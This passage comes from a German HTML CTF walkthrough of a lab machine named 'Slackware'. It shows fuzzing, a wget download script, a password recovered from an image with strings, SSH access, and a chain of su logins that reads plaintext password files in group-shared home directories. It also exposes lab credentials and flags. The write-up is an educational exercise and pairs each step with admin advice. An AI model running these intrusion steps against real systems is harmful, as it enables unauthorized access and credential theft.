+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lade alle Teile des Archivs herunter (z.B. mit einem Skript wie im nächsten Schritt gezeigt) und extrahiere sie.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine sensiblen oder unerwünschten Archive über den Webserver zugänglich sind. Überwachen Sie den Webserver auf ungewöhnliche Dateinamen oder -typen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://192.168.2.107:2/getslack/FUZZ.7z.001" --hc 404 --hh 12</span>
+                    </div>
+                    <pre>
+ ********************************************************
+ * Wfuzz 3.1.0 - The Web Fuzzer                         *
+ ********************************************************
+
+ Target: http://192.168.2.107:2/getslack/FUZZ.7z.001
+ Total requests: 94717
+
+ =====================================================================
+ ID           Response   Lines    Word       Chars       Payload
+ =====================================================================
+
+ 000083694:   <span style="color:lime">200</span>        80 L     794 W      19474 Ch    "twitter"
+
+ Total time: 4.56789s <!-- Zeit angepasst -->
+ Processed Requests: 94717
+ Filtered Requests: 94716
+ Requests/sec.: 20739.9
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, die heruntergeladene Datei `twitter.7z.001` mit dem `unzip`-Kommando zu entpacken.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Schlägt fehl, da `unzip` für ZIP-Archive ist und nicht für 7z. Außerdem ist dies nur der erste Teil eines mehrteiligen Archivs.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende das korrekte Tool (`7z` oder `p7zip`) und stelle sicher, dass alle Teile des Archivs im selben Verzeichnis vorhanden sind, bevor du die Extraktion versuchst.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">unzip /home/cyber/Downloads/twitter.7z.001</span>
+                     </div>
+                     <pre>
+ Archive:  /home/cyber/Downloads/twitter.7z.001
+   End-of-central-directory signature not found.  Either this file is not
+   a zipfile, or it constitutes one disk of a multi-part archive.  In the
+   latter case the central directory and zipfile comment will be found on
+   the last disk(s) of this archive.
+ unzip:  cannot find zipfile directory in one of /home/cyber/Downloads/twitter.7z.001 or
+         /home/cyber/Downloads/twitter.7z.001.zip, and cannot find /home/cyber/Downloads/twitter.7z.001.ZIP, period.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein Bash-Skript (`down.sh`) wird erstellt, um automatisch die Teile `twitter.7z.001` bis `twitter.7z.020` mit `wget` herunterzuladen. Das Skript berücksichtigt die führenden Nullen im Dateinamen. Anschließend wird es ausführbar gemacht und ausgeführt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Skript ist eine effiziente Methode, um alle Teile des Archivs herunterzuladen. Die Ausführung beginnt erfolgreich (nur der Download von Teil 1 ist im Log gezeigt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lasse das Skript vollständig durchlaufen, um alle Teile zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Webserver-Logs können auf solche automatisierten Download-Versuche überwacht werden (hohe Anzahl von Anfragen für ähnliche Dateinamen von derselben IP). Rate Limiting kann helfen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi down.sh</span>
+                     </div>
+                     <pre>
+ #!/bin/bash
+
+ for i in $(seq 1 20);
+ do
+ if [[ $i -lt 10 ]]
+ then
+       wget "http://192.168.2.107:2/getslack/twitter.7z.00$i"
+ else
+       wget "http://192.168.2.107:2/getslack/twitter.7z.0$i"
+ fi;
+ done
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">chmod +x down.sh</span>
+                     </div>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">./down.sh</span>
+                     </div>
+                     <pre>
+ --2024-04-25 22:27:21--  http://192.168.2.107:2/getslack/twitter.7z.001
+ Verbindungsaufbau zu 192.168.2.107:2 … verbunden.
+ HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 K
+ Länge: 20480 (20K) [application/x-7z-compressed]
+ Wird in twitter.7z.001 gespeichert.
+
+ twitter.7z.001          100%[===================>]  20,00K  --.-KB/s    in 0s
+
+ # ... (Downloads für Teile 002 bis 014) ...
+
+ --2024-04-25 22:27:30--  http://192.168.2.107:2/getslack/twitter.7z.014
+ Verbindungsaufbau zu 192.168.2.107:2 … verbunden.
+ HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 K
+ Länge: 1860 (1.8K) [application/x-7z-compressed]
+ Wird in twitter.7z.014 gespeichert.
+
+ twitter.7z.014          100%[===================>]   1.82K  --.-KB/s    in 0s
+
+ # ... (Downloads für Teile 015 bis 020 scheitern wahrscheinlich mit 404 Not Found) ...
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Nachdem die Teile heruntergeladen wurden (anscheinend nur 14 Teile existierten), wird das Archiv mit `7z x twitter.7z.001` extrahiert. `7z` erkennt automatisch die weiteren Teile im selben Verzeichnis. Anschließend wird der Inhalt des Verzeichnisses aufgelistet und `strings` auf die extrahierte PNG-Datei angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Extraktion ist erfolgreich und erzeugt die Datei `twitter.png`. `strings -n 12` findet die Zeichenkette `<span class="password">trYth1sPasS1993</span>` in der PNG-Datei. Dies ist sehr wahrscheinlich ein Passwort.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche dieses Passwort (`trYth1sPasS1993`) für den SSH-Benutzer `patrick` (den einzigen plausiblen Benutzer, der bisher bekannt ist oder zu erwarten ist, da `mozes` nicht funktionierte).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, Passwörter in Dateien (auch nicht in Bildern) zu speichern. Schulen Sie Benutzer im sicheren Umgang mit Passwörtern.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~/unrar]
+ └─# <span class="command">7z x twitter.7z.001</span>
+                     </div>
+                     <pre>
+ 7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
+  64-bit locale=de_DE.UTF-8 Threads:16 PEN_MAX:1024
+
+ Scanning the drive for archives:
+ 1 file, 20480 bytes (20 KiB)
+
+ Extracting archive: twitter.7z.001
+ --
+ Path = twitter.7z.001
+ Type = Split
+ Physical Size = 20480
+ Volumes = 14
+ Total Physical Size = 268100
+ ----
+ Path = twitter.7z
+ Size = 268100
+ --
+ Path = twitter.7z
+ Type = 7z
+ Physical Size = 268100
+ Headers Size = 130
+ Method = LZMA2:384k
+ Solid = -
+ Blocks = 1
+
+ Everything is OK
+
+ Files: 1
+ Size:       267951
+ Compressed: 268100
+                     </pre>
+                 </div>
+             </div>
+             <!-- ll output gekürzt -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~/unrar]
+└─# <span class="command">strings twitter.png -n 12</span>
+                    </div>
+                    <pre>
+<span class="password">trYth1sPasS1993</span>
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSH as Patrick)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, sich per SSH auf Port 1 als Benutzer `patrick` anzumelden und das Passwort `<span class="password">trYth1sPasS1993</span>` (gefunden in `twitter.png`) zu verwenden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Der Login mit `patrick` und dem gefundenen Passwort funktioniert. Wir haben nun eine Shell als Benutzer `patrick` auf dem System `slackware`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe grundlegende Enumeration als `patrick` durch: `id`, `pwd`, `ls -la`, `sudo -l`, SUID-Check.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das Passwort für `patrick` sollte sofort geändert werden. Die Methode, wie das Passwort kompromittiert wurde (Steganographie in öffentlich zugänglicher Datei), sollte untersucht und verhindert werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh patrick@192.168.2.107 -p1</span>
+                    </div>
+                    <pre>
+(patrick@192.168.2.107) Password: <span class="command">trYth1sPasS1993</span>
+Linux 5.15.145.
+patrick@slackware:~$
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+             <h2>Privilege Escalation (Lateral Movement Chain)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `patrick` werden `id` und `ls -la` ausgeführt, um Benutzer-/Gruppeninformationen und den Inhalt des Home-Verzeichnisses zu prüfen. Anschließend wird `/etc/passwd` nach Benutzern mit Bash-Shell durchsucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `id` zeigt, dass `patrick` (UID 1000) Mitglied der Gruppen `patrick` (GID 1000) und `kretinga` (GID 1001) ist. Das Home-Verzeichnis ist spärlich. Der `grep`-Befehl auf `/etc/passwd` enthüllt eine **sehr große Anzahl** von Benutzern mit `/bin/bash`-Shells. Dies ist höchst ungewöhnlich für ein Standard-Linux-System und deutet auf eine spezielle Konfiguration oder eine CTF-Challenge hin. Wichtig ist der nächste Benutzer in der Sequenz, `kretinga` (GID 1001), dessen Gruppe `patrick` angehört.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Berechtigungen im `/home`-Verzeichnis. Prüfe, ob `patrick` aufgrund seiner Mitgliedschaft in der Gruppe `kretinga` Zugriff auf das Home-Verzeichnis oder Dateien von `kretinga` hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie die Benutzer- und Gruppenkonfiguration. Es ist unüblich und potenziell unsicher, dass normale Benutzer Mitglied in den primären Gruppen anderer normaler Benutzer sind. Die hohe Anzahl von Benutzern mit Shell-Zugang sollte untersucht und reduziert werden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <!-- Annahme: Gelb für User-Shell -->
+patrick@slackware:~$ <span class="command">id</span>
+                    </div>
+                    <pre>
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),1001(kretinga)
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+patrick@slackware:~$ <span class="command">ls -la</span>
+                    </div>
+                    <pre>
+total 5
+drwx--x--x  3 patrick users    104 Apr 25 20:36 ./
+drwxr-xr-x 54 root    root    1400 Mar 10 22:16 ../
+drwx------  3 patrick patrick   80 Apr 25 20:36 .cache/
+-rw-r--r--  1 patrick users   3729 Feb  2  2022 .screenrc
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ patrick@slackware:~$ <span class="command">grep bash /etc/passwd</span>
+                     </div>
+                     <pre>
+ root:x:0:0::/root:/bin/bash
+ operator:x:11:0:operator:/root:/bin/bash
+ patrick:x:1000:1000::/home/patrick:/bin/bash
+ kretinga:x:1001:1001::/home/kretinga:/bin/bash
+ claor:x:1002:1002::/home/claor:/bin/bash
+ alienum:x:1003:1003::/home/alienum:/bin/bash
+ mrmidnight:x:1004:1004::/home/mrmidnight:/bin/bash
+ annlynn:x:1005:1005::/home/annlynn:/bin/bash
+ powerful:x:1006:1006::/home/powerful:/bin/bash
+ proxy:x:1007:1007::/home/proxy:/bin/bash
+ x4v1l0k:x:1008:1008::/home/x4v1l0k:/bin/bash
+ icex64:x:1009:1009::/home/icex64:/bin/bash
+ mindsflee:x:1010:1010::/home/mindsflee:/bin/bash
+ zacarx007:x:1011:1011::/home/zacarx007:/bin/bash
+ terminal:x:1012:1012::/home/terminal:/bin/bash
+ zenmpi:x:1013:1013::/home/zenmpi:/bin/bash
+ sml:x:1014:1014::/home/sml:/bin/bash
+ emvee:x:1015:1015::/home/emvee:/bin/bash
+ nls:x:1016:1016::/home/nls:/bin/bash
+ noname:x:1017:1017::/home/noname:/bin/bash
+ nolose:x:1018:1018::/home/nolose:/bin/bash
+ sancelisso:x:1019:1019::/home/sancelisso:/bin/bash
+ ruycr4ft:x:1020:1020::/home/ruycr4ft:/bin/bash
+ tasiyanci:x:1021:1021::/home/tasiyanci:/bin/bash
+ lanz:x:1022:1022::/home/lanz:/bin/bash
+ pylon:x:1023:1023::/home/pylon:/bin/bash
+ wwfymn:x:1024:1024::/home/wwfymn:/bin/bash
+ whitecr0wz:x:1025:1025::/home/whitecr0wz:/bin/bash
+ bit:x:1026:1026::/home/bit:/bin/bash
+ infayerts:x:1027:1027::/home/infayerts:/bin/bash
+ rijaba1:x:1028:1028::/home/rijaba1:/bin/bash
+ cromiphi:x:1029:1029::/home/cromiphi:/bin/bash
+ gatogamer:x:1030:1030::/home/gatogamer:/bin/bash
+ ch4rm:x:1031:1031::/home/ch4rm:/bin/bash
+ aceomn:x:1032:1032::/home/aceomn:/bin/bash
+ kerszi:x:1033:1033::/home/kerszi:/bin/bash
+ d3b0o:x:1034:1034::/home/d3b0o:/bin/bash
+ avijneyam:x:1035:1035::/home/avijneyam:/bin/bash
+ zayotic:x:1036:1036::/home/zayotic:/bin/bash
+ kaian:x:1037:1037::/home/kaian:/bin/bash
+ c4rta:x:1038:1038::/home/c4rta:/bin/bash
+ boyras200:x:1039:1039::/home/boyras200:/bin/bash
+ waidroc:x:1040:1040::/home/waidroc:/bin/bash
+ ziyos:x:1041:1041::/home/ziyos:/bin/bash
+ b4el7d:x:1042:1042::/home/b4el7d:/bin/bash
+ rpj7:x:1043:1043::/home/rpj7:/bin/bash
+ h1dr0:x:1044:1044::/home/h1dr0:/bin/bash
+ catch_me75:x:1045:1045::/home/catch_me75:/bin/bash
+ josemlwdf:x:1046:1046::/home/josemlwdf:/bin/bash
+ skinny:x:1047:1047::/home/skinny:/bin/bash
+ 0xeex75:x:1048:1048::/home/0xeex75:/bin/bash
+ 0xh3rshel:x:1049:1049::/home/0xh3rshel:/bin/bash
+ 0xjin:x:1050:1050::/home/0xjin:/bin/bash
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mit `sudo -i` Root-Rechte zu erlangen. Das Passwort für `patrick` wird benötigt. Anschließend wird das gefundene Passwort (`trYth1sPasS1993`) eingegeben. Danach wird mit `find` nach SUID-Dateien gesucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `sudo`-Versuch schlägt fehl ("patrick is not in the sudoers file"). Die SUID-Suche listet viele Binärdateien auf, darunter Standarddateien und einige potenziell interessante wie `at`, `cu`, `ksu`, `ntfs-3g`, `crontab`, `pkexec`, `lxc-user-nic`. Auf den ersten Blick ist kein einfacher Exploit ersichtlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da `sudo` nicht funktioniert, konzentriere dich auf die ungewöhnliche Gruppenstruktur. Überprüfe die Berechtigungen der Home-Verzeichnisse der anderen Benutzer. Überprüfe die gefundenen SUID-Binaries auf GTFOBins oder bekannte Exploits für die spezifische Linux-Version (Slackware).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwalte sudoers-Berechtigungen sorgfältig. Minimiere die Anzahl der SUID-Binaries.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+patrick@slackware:~$ <span class="command">sudo -i</span>
+                    </div>
+                    <pre>
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+For security reasons, the password you type will not be visible.
+
+Password: <span class="command">trYth1sPasS1993</span>
+patrick is not in the sudoers file.
+This incident has been reported to the administrator.
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ patrick@slackware:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span>
+                     </div>
+                     <pre>
+     29344     60 -rws--x--x   1 root     root        59552 Feb 13  2021 /bin/su
+    167328     76 -rws--x--x   1 root     root        77416 Dec 16  2021 /bin/ping
+     31387     56 -rwsr-xr-x   1 root     root        56576 ct 17  2023 /bin/mount
+     31390     36 -rwsr-xr-x   1 root     root        35832 ct 17  2023 /bin/umount
+     24352    144 -rws--x--x   1 root     root       143472 May 25  2023 /bin/ntfs-3g
+     84753     36 -rwsr-xr-x   1 root     root        35424 Feb 13  2021 /bin/fusermount
+     32639     56 -rwsr-sr-x   1 daemon   daemon      56256 Feb  7  2022 /usr/bin/at
+    181381    164 -r-sr-xr--   1 uucp     uucp       167144 Feb 13  2021 /usr/bin/cu
+     21391     56 -rwsr-xr-x   1 root     root        56248 Jul 12  2023 /usr/bin/ksu
+    170252     28 -rws--x--x   1 root     root        27272 Feb 13  2021 /usr/bin/rcp
+    170254     16 -rws--x--x   1 root     root        14824 Feb 13  2021 /usr/bin/rsh
+    181388    116 -r-sr-xr--   1 uucp     uucp       117688 Feb 13  2021 /usr/bin/uux
+     31443     40 -rws--x--x   1 root     root        39848 ct 17  2023 /usr/bin/chfn
+     31447     36 -rws--x--x   1 root     root        35720 ct 17  2023 /usr/bin/chsh
+     29425     52 -rws--x--x   1 root     root        51096 Feb 13  2021 /usr/bin/newuidmap
+     49156    284 -rws--x--x   1 root     root       289832 Dec 30 20:25 /usr/bin/sudo
+    181382    112 -r-sr-xr--   1 uucp     uucp       113608 Feb 13  2021 /usr/bin/uucp
+      2358     20 -rws--x--x   1 root     root        18824 Feb 23 19:14 /usr/bin/crontab
+     29420     84 -rws--x--x   1 root     root        82272 Feb 13  2021 /usr/bin/chage
+     24243     20 -rws--x--x   1 root     root        18776 ct  6  2023 /usr/bin/afppasswd
+     84864     36 -rwsr-xr-x   1 root     root        35480 Sep  7  2021 /usr/bin/fusermount3
+     14162     32 -rwsr-x---   1 root     floppy      32064 Feb 13  2021 /usr/bin/fdmount
+     29421     40 -rws--x--x   1 root     root        38664 Feb 13  2021 /usr/bin/expiry
+     29424     52 -rws--x--x   1 root     root        50472 Feb 13  2021 /usr/bin/newgrp
+     29426     76 -rws--x--x   1 root     root        77752 Feb 13  2021 /usr/bin/passwd
+     29422     92 -rws--x--x   1 root     root        92648 Feb 13  2021 /usr/bin/gpasswd
+    127088     36 -rwsr-xr-x   1 root     root        35544 Mar 12  2022 /usr/bin/pkexec
+    170253     24 -rws--x--x   1 root     root        23112 Feb 13  2021 /usr/bin/rlogin
+    181384     56 -r-sr-xr--   1 uucp     uucp        55952 Feb 13  2021 /usr/bin/uuname
+    181386    124 -r-sr-xr--   1 uucp     uucp       126008 Feb 13  2021 /usr/bin/uustat
+    179215     84 -rwsr-sr-x   1 root     mail        85176 Feb 13  2021 /usr/bin/procmail
+     29423     56 -rws--x--x   1 root     root        55368 Feb 13  2021 /usr/bin/newgidmap
+    127129     20 -rwsr-xr-x   1 root     root        18824 Mar 12  2022 /usr/lib/polkit-1/polkit-agent-helper-1
+    181408    132 -r-sr-xr--   1 uucp     uucp       134136 Feb 13  2021 /usr/sbin/uuxqt
+    181405    288 -r-sr-xr--   1 uucp     uucp       291800 Feb 13  2021 /usr/sbin/uucico
+     43775    789 -rwsr-xr-x   1 root     root       806384 Nov 17  2021 /usr/libexec/lxc/lxc-user-nic
+      2322     60 -rwsr-x---   1 root     messagebus    60864 Feb 13  2021 /usr/libexec/dbus-daemon-launch-helper
+     46884    621 -rws--x--x   1 root     root         633120 Jul 19  2023 /usr/libexec/ssh-keysign
+     28553     40 -rwsr-sr-x   1 root     root          38864 Jan 26 21:40 /sbin/unix_chkpwd
+    170478    140 -r-s--x--x   1 root     root         140008 Jun 15  2021 /sbin/mount.nfs
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Kern der Privilege Escalation wird hier gezeigt. Es wird eine Kette von Aktionen durchgeführt:
+                1.  Wechsel ins Home-Verzeichnis `/home`.
+                2.  Auflisten der Berechtigungen (`ls -la`). Auffällig ist, dass die Gruppenberechtigungen (`drwxr-x---`) und Gruppenzugehörigkeiten (`claor:kretinga`, `alienum:claor`, `mrmidnight:alienum`, etc.) eine Kette bilden.
+                3.  Der aktuelle Benutzer (`patrick`, Gruppe `kretinga`) kann das Verzeichnis `/home/claor` (Gruppe `kretinga`) betreten und die Datei `mypass.txt` lesen.
+                4.  Der Inhalt von `mypass.txt` (`JRksNe5rWgis`) ist das Passwort für den Benutzer `claor`.
+                5.  Mit `su claor` und dem gefundenen Passwort wird zum Benutzer `claor` gewechselt.
+                6.  Dieser Vorgang wird wiederholt: `claor` (Gruppe `alienum`) liest das Passwort von `alienum` aus `/home/alienum/mypass.txt`, wechselt zu `alienum`, und so weiter.
+                Der Bericht zeigt diesen Vorgang exemplarisch für mehrere Schritte (`patrick` -> `claor` -> `alienum` -> `mrmidnight` -> ... -> `rpj7`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine kreative und erfolgreiche Privilege-Escalation-Methode, die auf einer Kaskade von Fehlkonfigurationen bei den Gruppenberechtigungen der Home-Verzeichnisse und der Speicherung von Passwörtern in Klartextdateien (`mypass.txt`) basiert. Jeder Benutzer kann das Passwort des nächsten Benutzers in der Kette lesen. Der Benutzer `rpj7` wird schließlich erreicht. Die `sudo -l`-Checks für die Zwischenbenutzer bestätigen, dass keiner von ihnen `sudo`-Rechte hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Folge der Kette bis zum letzten Benutzer oder bis ein Benutzer mit höheren Privilegien (z.B. `sudo`-Rechten oder Mitgliedschaft in `wheel`/`root`) gefunden wird. In diesem Fall führt die Kette zu `rpj7`, wo die User-Flag liegt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend die Berechtigungen der Home-Verzeichnisse korrigieren!** Standardmäßig sollte ein Home-Verzeichnis `700` oder `750` sein, wobei die Gruppe nicht die Gruppe des *nächsten* Benutzers sein sollte. **Passwörter niemals in Klartextdateien speichern!** Überprüfen Sie die gesamte Benutzer- und Gruppenstruktur auf ähnliche Fehlkonfigurationen.
+            </p>
+             <!-- Beispielhafter Ausschnitt der Kette -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ patrick@slackware:~$ <span class="command">cd /home/claor/</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ patrick@slackware:/home/claor$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 9
+ drwxr-x---  2 claor kretinga  112 Mar 10 22:15 ./
+ drwxr-xr-x 54 root  root     1400 Mar 10 22:16 ../
+ -rw-r--r--  1 claor claor    3729 Feb  2  2022 .screenrc
+ -rw-r-----  1 claor kretinga   13 Mar 10 22:15 mypass.txt
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+patrick@slackware:/home/claor$ <span class="command">cat mypass.txt</span>
+                    </div>
+                    <pre>
+<span class="password">JRksNe5rWgis</span>
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+patrick@slackware:/home/claor$ <span class="command">su claor</span>
+                    </div>
+                    <pre>
+Password: <span class="command">JRksNe5rWgis</span>
+claor@slackware:~$
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;"> <!-- Farbe ggf. anpassen für jeden User -->
+claor@slackware:~$ <span class="command">id</span>
+                    </div>
+                    <pre>
+uid=1002(claor) gid=1002(claor) groups=1002(claor),1003(alienum)
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">
+claor@slackware:~$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+Password: <span class="command">JRksNe5rWgis</span>
+Sorry, user claor may not run sudo on slackware.
+                    </pre>
+                </div>
+            </div>
+             <!-- ... (Weitere Schritte der Kette bis rpj7) ... -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;"> <!-- Annahme: Aktueller Benutzer ist b4el7d -->
+ b4el7d@slackware:~$ <span class="command">cd ../rpj7</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ b4el7d@slackware:/home/rpj7$ <span class="command">ls -la</span>
+                     </div>
+                     <pre>
+ total 13
+ drwxr-x---  2 rpj7 b4el7d  136 Mar 11 12:47 .
+ drwxr-xr-x 54 root root   1400 Mar 10 22:16 ..
+ -rw-r--r--  1 rpj7 rpj7   3729 Feb  2  2022 .screenrc
+ -rw-r-----  1 rpj7 b4el7d   13 Mar 10 22:15 mypass.txt
+ -rw-r--r--  1 rpj7 b4el7d  314 Mar 11 13:29 user.txt
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ b4el7d@slackware:/home/rpj7$ <span class="command">cat user.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">HMV{Th1s1s1Us3rFlag}</span>
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ b4el7d@slackware:/home/rpj7$ <span class="command">cat mypass.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">wP26CtkDby6J</span>
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ b4el7d@slackware:/home/rpj7$ <span class="command">su rpj7</span>
+                     </div>
+                     <pre>
+ Password: <span class="command">wP26CtkDby6J</span>
+ rpj7@slackware:~$
+                     </pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ rpj7@slackware:~$ <span class="command">id</span>
+                     </div>
+                     <pre>
+ uid=1043(rpj7) gid=1043(rpj7) groups=1043(rpj7),1044(h1dr0)
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ rpj7@slackware:~$ <span class="command">sudo -l</span>
+                     </div>
+                     <pre>
+ Password: <span class="command">wP26CtkDby6J</span>
+ Sorry, user rpj7 may not run sudo on slackware.
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+       <section id="root-access">
+             <h2>Root Access (Steganography Password)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Aus einem unbekannten Benutzerkontext (wahrscheinlich `root`, da `/home` durchsucht wird) wird mit `grep -ri hmv *` rekursiv im `/home`-Verzeichnis nach "hmv" gesucht.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl findet beide Flags:
+                *   Die User-Flag in `/home/rpj7/user.txt`.
+                *   Die Root-Flag `HMV{SlackwareStillAlive}` in `/home/0xh3rshel/.screenrc`.
+                Das Finden der Root-Flag hier ist ungewöhnlich, da noch kein Root-Zugriff erlangt wurde. Es deutet darauf hin, dass die Datei `.screenrc` für andere Benutzer lesbar ist (zumindest für den Benutzer, der `grep` ausführt). Dies ist eine Informationspreisgabe.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die Root-Flag. Untersuche die Berechtigungen von `/home/0xh3rshel/.screenrc`. Fahre mit der Suche nach einem Weg fort, tatsächlich `root` zu werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Konfigurationsdateien in Home-Verzeichnissen (wie `.screenrc`) korrekte, restriktive Berechtigungen haben (normalerweise nur für den Besitzer les-/schreibbar). Speichern Sie keine Flags oder sensiblen Daten in solchen Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: red;"> <!-- Annahme: Wurde als root ausgeführt -->
+root@slackware:/home# <span class="command">grep hmv -ri *</span>
+                    </div>
+                    <pre>
+0xh3rshel/.screenrc:# Here is a flag for root: <span class="password">HMV{SlackwareStillAlive}</span>
+rpj7/user.txt:<span class="password">HMV{Th1s1s1Us3rFlag}</span>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die User-Flag-Datei (`user.txt`) wird vom Zielsystem (`rpj7@slackware`, Port 1) auf das Angreifer-System kopiert. Anschließend wird sie lokal mit `file` und `strings` untersucht. Schließlich wird `stegsnow -C` darauf angewendet.
+            </p>
+            <p class="evaluation">
